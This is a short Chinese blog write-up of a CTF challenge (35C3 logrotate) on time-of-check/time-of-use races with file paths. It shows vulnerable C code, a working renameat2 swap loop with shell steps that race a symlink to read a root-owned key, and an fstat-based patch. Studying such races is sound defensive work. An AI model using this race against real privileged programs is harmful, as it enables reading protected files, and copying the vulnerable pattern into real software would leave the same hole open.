---
title: Race condition in file path
---

Liveoverflow 上看到的小知识，题目来自 [35c3 ctf logrotate](https://github.com/sroettger/35c3ctf_chals/tree/master/logrotate)，感觉在许多地方见过类似的代码，以后要留心类似的问题。

Tl;dr 同一个 filepath 在一个流程中被反复使用，都可能导致 race 的问题。

## Example code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char** argv) {
    char* path = argv[1];
    struct stat info;
    stat(path, &info);
    if (info.st_uid == 0) {
        printf("The file is owned by root, permission denied");
        exit(0);
    } else {
        char buf[100];
        int fd = open(path, O_RDONLY);
        read(fd, &buf, 100);
        printf("%s", buf);
    }
    return 0;
}
```

该程序检查了对应的文件是否属于 root，如果属于 root 则不操作并退出程序。

## Exploition

我们可以看到 path 在 stat 上使用了一次，之后在 open 的时候又使用了一次，这中间的窗口可以用于竞争，即首先让 path 是一个不属于 root 的文件，到 open 的时候如果 path 是指向我们想要读取的文件的符号链接的话，就可以顺利读取到本无法读取到的文件。

这里借助原题提供的 rename.c 来帮助我们完成这个操作。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

该文件会不断地交换两个文件的文件名。

我们首先创建一个符号链接，指向属于 root 的 key，然后创建一个普通的文件。

```sh
ln -s key key_link
touch test
```

然后使用 rename 程序来让 *key_link* 与 *test* 不断的交换文件名

```sh
./rename key_link test
```

再使用程序传入符号链接的路径

```sh
./race key_link
```

多尝试几次，就会读到 key 的内容。

## Extension

在实际运用中，有很多种类型的程序都会存在类似的问题，比如定制过的操作系统中，一些具有 suid 的程序，在对于一些文件的操作上，需要分外小心。

## Patch

这类问题的修复比较容易，不使用 path，使用 fd 即可。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char** argv) {
    char* path = argv[1];
    struct stat info;
    int fd = open(path, O_RDONLY);
    fstat(fd, &info);
    if (info.st_uid == 0) {
        printf("The file is owned by root, permission denied");
        exit(0);
    } else {
        char buf[100];
        read(fd, &buf, 100);
        printf("%s", buf);
    }
    return 0;
}
```

这样的话就不会两次使用同一 path 来判断了。

还有一种情况，就是在文件名通过检查后，需要将文件名传递给另一个程序继续使用，这时候其实无法传递 fd，不过仍然可以使用 `/proc/self/fd/x` 来传递当前程序的 fd。